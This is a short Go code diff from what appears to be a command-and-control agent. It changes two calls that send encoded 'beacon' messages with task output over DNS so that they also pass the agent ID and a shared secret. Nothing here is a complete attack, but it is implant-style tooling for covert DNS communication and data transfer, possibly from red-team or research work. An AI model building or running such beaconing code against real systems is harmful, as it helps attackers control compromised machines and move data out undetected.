@@ -107,7 +107,7 @@ func Run(cfg *Config) {
 				if encodeErr != nil {
 					continue
 				}
-				respBytes, err = sendBeaconDNSFn(dnsEncoded, cfg.DNSDomain)
+				respBytes, err = sendBeaconDNSFn(dnsEncoded, cfg.DNSDomain, cfg.AgentID, cfg.Secret)
 				if errors.Is(err, errDNSBeaconTooLarge) && pendingResult != nil {
 					// Large results cannot be transported safely through DNS. Replace
 					// the blocking result with an explicit terminal error so later
@@ -121,7 +121,7 @@ func Run(cfg *Config) {
 					beacon.TaskOutput = replacement
 					dnsEncoded, encodeErr = protocol.EncodeBeacon(beacon, cfg.Secret)
 					if encodeErr == nil {
-						respBytes, err = sendBeaconDNSFn(dnsEncoded, cfg.DNSDomain)
+						respBytes, err = sendBeaconDNSFn(dnsEncoded, cfg.DNSDomain, cfg.AgentID, cfg.Secret)
 					}
 				}
 				if err != nil {
